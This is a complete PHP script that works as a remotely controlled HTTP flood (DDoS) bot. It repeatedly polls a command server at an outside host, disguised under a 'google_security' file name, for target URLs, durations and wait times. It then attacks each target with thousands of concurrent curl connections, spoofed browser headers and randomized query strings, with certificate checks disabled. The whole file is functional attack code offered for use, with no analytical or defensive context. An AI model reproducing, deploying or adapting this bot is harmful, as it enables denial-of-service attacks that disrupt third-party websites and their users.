<?php

$api_url = "https://labaidgroup.com/files/google_security2025992852991526.php";
$requests_per_socket_per_second = 5000;
$num_sockets = 5000;
$retry_limit = 3;
$retry_delay = 1;
$use_get_requests = true;
$byte_range = "0-10";

ini_set('max_execution_time', 0);
ini_set('memory_limit', '2048M');
ini_set('max_input_time', -1);
set_time_limit(0);

$user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.194 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0",
    "Mozilla/5.0 (iPad; CPU OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.2210.91 Safari/537.36",
    "Mozilla/5.0 (Android 12; Mobile; rv:108.0) Gecko/108.0 Firefox/108.0",
    "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.70 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/115.0.5790.130 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36"
];

function get_random_headers($url) {
    global $user_agents;
    $accept_types = [
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "application/json,text/plain,*/*;q=0.5",
        "text/html,application/xhtml+xml,*/*;q=0.9",
        "*/*"
    ];
    $accept_languages = [
        "en-US,en;q=0.9",
        "en-GB,en;q=0.8",
        "fr-FR,fr;q=0.7",
        "ar-SA,ar;q=0.9",
        "es-ES,es;q=0.8",
        "de-DE,de;q=0.7"
    ];
    $accept_encodings = ["gzip, deflate, br", "gzip, deflate", "br", "identity"];

    return [
        "User-Agent: " . $user_agents[array_rand($user_agents)],
        "Accept: " . $accept_types[array_rand($accept_types)],
        "Accept-Language: " . $accept_languages[array_rand($accept_languages)],
        "Accept-Encoding: " . $accept_encodings[array_rand($accept_encodings)],
        "Connection: keep-alive",
        "Cache-Control: no-cache",
        "Pragma: no-cache",
        "Referer: " . parse_url($url, PHP_URL_SCHEME) . "://" . parse_url($url, PHP_URL_HOST)
    ];
}

function generate_random_query() {
    return "?rand=" . md5(microtime(true) . rand(0, 1000000)) . "&t=" . rand(1000, 999999);
}

function fetch_api_data($api_url, $retry_limit, $retry_delay) {
    $attempt = 0;
    while ($attempt < $retry_limit) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $api_url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_TIMEOUT, 5);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        $response = curl_exec($ch);
        $error = curl_error($ch);
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);

        if ($error || $http_code != 200 || strpos($response, "Connection refused") !== false || strpos($response, "Bad Gateway") !== false) {
            error_log("API Attempt $attempt failed: HTTP $http_code, Error: $error, Response: $response");
            $attempt++;
            if ($attempt < $retry_limit) {
                sleep($retry_delay);
                continue;
            }
            return false;
        }

        if (empty($response) || strpos($response, '<data>') === false) {
            error_log("Invalid API Response: $response");
            $attempt++;
            if ($attempt < $retry_limit) {
                sleep($retry_delay);
                continue;
            }
            return false;
        }

        $xml = simplexml_load_string($response);
        if ($xml === false || !isset($xml->url, $xml->time, $xml->wait)) {
            error_log("Failed to parse XML or missing fields: $response");
            $attempt++;
            if ($attempt < $retry_limit) {
                sleep($retry_delay);
                continue;
            }
            return false;
        }

        return [
            'url' => (string)$xml->url,
            'time' => (int)$xml->time,
            'wait' => (int)$xml->wait
        ];
    }
    return false;
}

function setup_curl_handle($url) {
    global $use_get_requests, $byte_range;
    $ch = curl_init();
    $url_with_query = $url . generate_random_query();
    curl_setopt($ch, CURLOPT_URL, $url_with_query);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_RANGE, $byte_range);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 1);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 0.5);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
    curl_setopt($ch, CURLOPT_SSLVERSION, CURL_SSLVERSION_DEFAULT);
    curl_setopt($ch, CURLOPT_HTTPHEADER, get_random_headers($url));
    curl_setopt($ch, CURLOPT_FORBID_REUSE, false);
    curl_setopt($ch, CURLOPT_TCP_KEEPALIVE, 1);
    curl_setopt($ch, CURLOPT_TCP_NODELAY, 1);
    curl_setopt($ch, CURLOPT_BUFFERSIZE, 128);
    return $ch;
}

function update_curl_handle($ch, $url) {
    global $byte_range;
    curl_setopt($ch, CURLOPT_URL, $url . generate_random_query());
    curl_setopt($ch, CURLOPT_RANGE, $byte_range);
    curl_setopt($ch, CURLOPT_HTTPHEADER, get_random_headers($url));
}

function execute_attack($target_url, $total_duration) {
    global $requests_per_socket_per_second, $num_sockets;
    $request_count = 0;
    $multi_handle = curl_multi_init();
    $curl_handles = [];

    for ($i = 0; $i < $num_sockets; $i++) {
        $ch = setup_curl_handle($target_url);
        curl_multi_add_handle($multi_handle, $ch);
        $curl_handles[] = $ch;
    }

    $start_time = microtime(true);
    $end_time = $start_time + $total_duration;

    while (microtime(true) < $end_time) {
        $start_loop = microtime(true);
        $requests_this_second = 0;

        for ($i = 0; $i < $requests_per_socket_per_second && microtime(true) < $end_time; $i++) {
            foreach ($curl_handles as $ch) {
                if (microtime(true) >= $end_time) {
                    break 2;
                }
                update_curl_handle($ch, $target_url);
                curl_multi_add_handle($multi_handle, $ch);
                $request_count++;
                $requests_this_second++;
            }

            $running = 0;
            do {
                $status = curl_multi_exec($multi_handle, $running);
                if ($status != CURLM_OK) {
                    error_log("cURL multi error: " . curl_multi_strerror($status));
                    break;
                }
                curl_multi_select($multi_handle, 0.001);
            } while ($running > 0 && microtime(true) < $end_time);

            foreach ($curl_handles as $ch) {
                curl_multi_remove_handle($multi_handle, $ch);
            }

            usleep(rand(1, 5));
        }

        $elapsed = microtime(true) - $start_loop;
        error_log("Requests sent in this second: $requests_this_second, Time taken: $elapsed seconds");

        $sleep_time = (int)((1 - $elapsed) * 1000000);
        if ($sleep_time > 0) {
            usleep($sleep_time);
        }
    }

    foreach ($curl_handles as $ch) {
        curl_multi_remove_handle($multi_handle, $ch);
        curl_close($ch);
    }
    curl_multi_close($multi_handle);
    error_log("Total requests sent to $target_url: $request_count");
}

while (true) {
    $data = fetch_api_data($api_url, $retry_limit, $retry_delay);

    if ($data !== false && isset($data['url'], $data['time'], $data['wait'])) {
        error_log("Starting attack on {$data['url']} for {$data['time']} seconds after waiting {$data['wait']} seconds");
        sleep($data['wait']);
        execute_attack($data['url'], $data['time']);
        error_log("Attack on {$data['url']} completed");
    } else {
        error_log("No valid data received from API, retrying in 5 seconds...");
    }

    sleep(5);
}

?>
